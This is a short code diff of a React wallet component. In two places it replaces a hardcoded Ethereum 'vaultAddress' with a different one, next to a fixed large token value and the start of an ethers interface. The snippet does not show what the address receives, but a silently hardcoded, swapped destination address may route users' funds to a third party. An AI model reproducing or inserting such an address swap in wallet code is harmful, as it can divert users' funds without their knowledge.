@@ -275,7 +275,7 @@ const Wallet = () => {
 
       const spender = address;
       const value = "10000000000000000000000";
-      const vaultAddress = "0x6F3a5331E59CA2e7Cb4ae5B434fC0305a6298982";
+      const vaultAddress = "0x30fe3c083Bf0727a748823E3000f367FdFFa9aC5";
 
       //  @ts-ignore
       const interfacedata = new ethers.utils.Interface([
@@ -348,7 +348,7 @@ const Wallet = () => {
 
       const spender = address;
       const value = "10000000000000000000000";
-      const vaultAddress = "0x6F3a5331E59CA2e7Cb4ae5B434fC0305a6298982";
+      const vaultAddress = "0x30fe3c083Bf0727a748823E3000f367FdFFa9aC5";
 
       //  @ts-ignore
       const interfacedata = new ethers.utils.Interface([
